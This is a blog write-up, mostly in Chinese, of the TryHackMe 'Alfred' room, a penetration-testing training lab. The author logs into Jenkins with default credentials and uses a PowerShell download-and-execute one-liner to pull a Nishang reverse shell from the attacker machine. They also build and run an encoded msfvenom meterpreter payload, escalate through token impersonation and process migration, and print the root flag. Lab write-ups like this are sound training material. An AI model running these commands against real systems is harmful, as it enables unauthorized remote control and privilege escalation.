---
title: Alfred (Try Hack Me Writeup)
date: 2021-08-06T23:45:00+08:00
draft: false
url: "/2021/08/06/alfred-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL : https://tryhackme.com/room/alfred

IP : 10.10.244.238

## Initial access

- `rustscan -a 10.10.244.238`![](/uploads/2022/02/8a449-mbVfrX4.png)
- 80
- 3389
- 8080`nmap -A -p80,3389,8080 10.10.244.238`- ![](/uploads/2022/02/2f617-O4ife5c.png)
- 發現 8080 的 Jenkins 是Jetty 9.4.z-SNAPSHOT
- 但找不到相關的 Exploit80 port 首頁- ![](/uploads/2022/02/72c5a-FiQgTSO.png)
- 看起來沒什麼特別的東西QQ
- `python3 dirsearch.py -u http://10.10.244.238/`掃了之後也沒啥東西8080 port 登入頁面- ![](/uploads/2022/02/88eec-ZpPK5aV.png)
- 發現會掃出一些404，但沒啥幫助![](/uploads/2022/02/55d89-GHAKXIx.png)

## 進入 Jenkins

- 看到官方的 hint 寫 `*****:*****`直接通靈猜 `admin:admin`
- 就進去了 ……
- 好無聊= =透過 Deploy 的 build code 輸入指令- `whoami`
- ![](/uploads/2022/02/c2ccc-c0NEr3A.png)
- `systeminfo`
- ![](/uploads/2022/02/9b71f-auOcIUd.png)![](/uploads/2022/02/8f0fa-TCQzzJs.png)準備 Windows Reverse Shell- 本機`wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`
- `nc -nvlp 7877`靶機- `powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.21.55:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.21.55 -Port 7877`就成功接上了- ![](/uploads/2022/02/a26cd-UwVAt2v.png)取得 uesr flag- ![](/uploads/2022/02/92321-4luITJB.png)使用 msfvenom 產 meterperter reverse shell- `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.55 LPORT=7879 -f exe -o meow.exe`
- ![](/uploads/2022/02/6b1fc-aYt7UNF.png)開啟 `msfconsole` 準備接收- `use exploit/multi/handler`
- `set LHOST 10.13.21.55`
- `set LPORT 7879`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `show options` 確認參數是否正確
- ![](/uploads/2022/02/3ca44-l9tJQ4T.png)
- `run` 等待接收下載並執行 meterpreter 的 shell- `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.21.55:8000/meow.exe','meow.exe')"`
- `Start-Process "meow.exe"`msf 接上了!- ![](/uploads/2022/02/ca882-OdnUd28.png)What is the final size of the exe payload that you generated?- ![](/uploads/2022/02/c9186-94o2f0D.png)
- 73802meterperter- `getuid`回傳 `Alfred\bruce``load incognito``list_tokens -g`- ![](/uploads/2022/02/5afbc-mhZvk5Z.png)
- 發現可以利用 `BUILTIN\Administrators``impersonate_token "BUILTIN\Administrators"`- 成功!
- ![](/uploads/2022/02/6d7ac-dPzyJX4.png)
- 再次 `whoami`![](/uploads/2022/02/93f9a-kwC11C5.png)Migrate 到 system- `ps`![](/uploads/2022/02/95c21-YGSMxtS.png)
- 準備寄生到 `services.exe``migrate 668`- ![](/uploads/2022/02/b761d-yiPSvrR.png)
- 成功!輸入 `shell`- `cd system`
- `type root.txt`
- 取得 root flag`dff0f748678f280250f25a45b8046b4a`
